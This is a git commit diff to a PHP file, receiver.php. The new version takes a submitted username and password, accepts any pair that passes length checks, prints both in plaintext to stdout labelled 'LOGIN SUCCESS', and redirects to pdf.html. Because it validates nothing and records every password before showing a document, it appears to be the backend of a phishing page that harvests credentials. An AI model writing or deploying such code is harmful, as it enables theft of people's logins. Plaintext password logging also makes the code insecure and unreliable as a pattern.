6f0f9bc1a729ca6e9976c7c404ca0e2cc2299687
Sachin Badasra <jaatchanderbhanchoudhary@gmail.com>
2025-12-29 19:39:41 +0530

    Update receiver.php

--- receiver.php
+++ receiver.php
@@ -1,10 +1,23 @@
 <?php
-if (isset($_POST['user_input'])) {
-    $data = $_POST['user_input'];
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
-    // print to terminal
-    file_put_contents("php://stdout", "User entered: $data\n");
+    $username = $_POST['username'] ?? '';
+    $password = $_POST['password'] ?? '';
 
-    echo "Data received successfully";
+    // Backend validation
+    if (strlen($username) < 6 || strlen($password) < 9) {
+        echo "❌ Error: Username must be >5 and Password >8 characters";
+        exit;
+    }
+
+    // Print to terminal
+    file_put_contents(
+        "php://stdout",
+        "LOGIN SUCCESS | USER: $username | PASS: $password\n"
+    );
+
+    // Redirect to pdf page
+    header("Location: pdf.html");
+    exit;
 }
 ?>
